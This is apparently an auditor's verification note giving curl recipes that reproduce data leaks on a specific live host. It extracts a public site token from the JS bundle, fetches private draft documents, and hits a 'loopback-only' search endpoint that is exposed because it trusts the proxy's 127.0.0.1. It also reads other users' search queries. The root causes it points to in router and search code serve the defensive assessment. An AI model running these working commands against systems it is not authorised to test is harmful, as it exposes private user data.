# Leak blast-radius re-derivation recipes — 2026-07-26

Verifier: leak-blast-radius-probe (search-template W10). Live target: `https://guerrilla.barkpark.cloud`.
All commands below are read-only GETs. `T` = the PUBLIC site token, readable by anyone from the
deployed JS bundle.

## R0 — extract the shipped site token (the MUST-RUN one-liner is BROKEN)

The briefed extraction returns an empty token: the chunk `src` attributes are
`/sites/search-ember/_next/static/chunks/…`, and `grep -oE '/_next/static/chunks/…'`
strips the `/sites/search-ember` prefix, so every follow-up curl 404s. Working form:

```sh
cd "$(mktemp -d)"
curl -sL -o ember.html https://guerrilla.barkpark.cloud/sites/search-ember/   # note: 308 without -L
for c in $(grep -oE 'src="/sites/search-ember/_next/static/chunks/[^"]+\.js"' ember.html \
           | sed 's/src="//;s/"$//' | sort -u); do
  curl -sL "https://guerrilla.barkpark.cloud$c" -o "$(basename "$c" | md5).js"
done
grep -ho 'guerrilla.barkpark.cloud/socket",[A-Za-z]="[A-Za-z0-9]\{20,\}"' *.js
# → R="https://guerrilla.barkpark.cloud/socket",A="<43-char token>"
```

## R1 — drafts listing leak (known) and its true breadth

```sh
curl -s -H "Authorization: Bearer $T" \
 'https://guerrilla.barkpark.cloud/w/default/p/default/v1/data/search/production?q=e&perspective=drafts&limit=100'
# count=164 (task 104, mediaAsset 43, paper 11, book/bossType/form_response/post/sheet/ticket 1 each)
```

## R2 — NEW: full draft document fetch by explicit `drafts.` id (scoped AND flat doc routes)

```sh
curl -s -o /dev/null -w '%{http_code} %{size_download}\n' -H "Authorization: Bearer $T" \
 'https://guerrilla.barkpark.cloud/w/default/p/default/v1/data/doc/production/task/drafts.task-0c3997db3bdfe3ca'   # 200 7557
curl -s -o /dev/null -w '%{http_code} %{size_download}\n' -H "Authorization: Bearer $T" \
 'https://guerrilla.barkpark.cloud/v1/data/doc/production/task/drafts.task-0c3997db3bdfe3ca'                       # 200 7557
curl -s -o /dev/null -w '%{http_code} %{size_download}\n' -H "Authorization: Bearer $T" \
 'https://guerrilla.barkpark.cloud/v1/data/doc/production/paper/drafts.paper-9cb57212fe9a1d63'                     # 200 110639
# contrast — the SAME route rejects the query-param form:
curl -s -H "Authorization: Bearer $T" \
 'https://guerrilla.barkpark.cloud/w/default/p/default/v1/data/doc/production/task/task-0c3997db3bdfe3ca?perspective=drafts'
# {"error":"perspective not allowed"} 403
```

## R3 — NEW (worst): the "loopback-only" search endpoint is public

```sh
curl -s -D- -o body.json \
 'https://guerrilla.barkpark.cloud/v1/data/local/search/production?q=e&perspective=drafts&limit=2'
# HTTP/2 200, via: 1.1 Caddy — 164 drafts, NO token, NO header
curl -s 'https://guerrilla.barkpark.cloud/v1/data/local/search/production?q=e&type=session&limit=1'
# 200 — full private-visibility session doc
```

Cause: `:api_local` = `accepts(json)` + `Plugs.RequireLoopback` (router.ex:132-135), and
`RequireLoopback` reads raw `conn.remote_ip`, which behind Caddy is always `127.0.0.1`.
`grep -n 'RemoteIp\|remote_ip'` returns nothing in `router.ex` or `endpoint.ex`.

## R4 — preview family: does NOT honour `?perspective=drafts`

```sh
S=https://guerrilla.barkpark.cloud/w/default/p/default
for u in "v1/preview/query/production/task?limit=1&perspective=drafts" \
         "v1/preview/backlinks/production/drafts.task-0c3997db3bdfe3ca?perspective=drafts" \
         "v1/preview/related/production/drafts.task-0c3997db3bdfe3ca?perspective=drafts" \
         "v1/preview/tags/production?perspective=drafts"; do
  curl -s -H "Authorization: Bearer $T" "$S/$u" | grep -c '_draft":true'   # all 0
done
# BUT: v1/preview/doc/production/task/drafts.<id> → 200, _draft:true (same hole as R2)
```

## R5 — suggestions `recent` is a shared/attacker-chosen bucket

```sh
curl -s 'https://guerrilla.barkpark.cloud/v1/data/search/production/suggestions?limit=8'
# a caller who has never searched receives other people's live queries verbatim
```

`SearchIntel.actor_key/1` (search_intel.ex:7-18) = `x-bp-search-client` header (caller-chosen) →
else `token:<id>` → else the literal `"anon"`. `recent_queries/5` (intelligence.ex:627-640) filters
on `surface, scope, actor_key` only — no `workspace_id` (unlike `popular`/`nohits`, which pipe
`scope_ws`).

## R6 — tokenless private-type leak, full type sweep

```sh
for t in <39 schema names from /api/schemas>; do
  curl -s -o /dev/null -w "$t query=%{http_code} " "https://guerrilla.barkpark.cloud/v1/data/query/production/$t?limit=1"
  curl -s "https://guerrilla.barkpark.cloud/v1/data/search/production?q=e&type=$t&limit=1" | jq .count
done
# query=200 only for: command, metric, paper, tag, task
# leak (query=404 but searchable): session (3), listener (1), document (4)   [+ bulldoc: private, 0 docs]
```

## R7 — dataset validation is absent on HTTP too

```sh
for ds in staging development demo test default sandbox search-demo; do
  curl -s -o /dev/null -w "$ds %{http_code}\n" "https://guerrilla.barkpark.cloud/v1/data/search/$ds?q=e&limit=1"
done   # every one 200 with count 0 — no unknown-dataset rejection
```
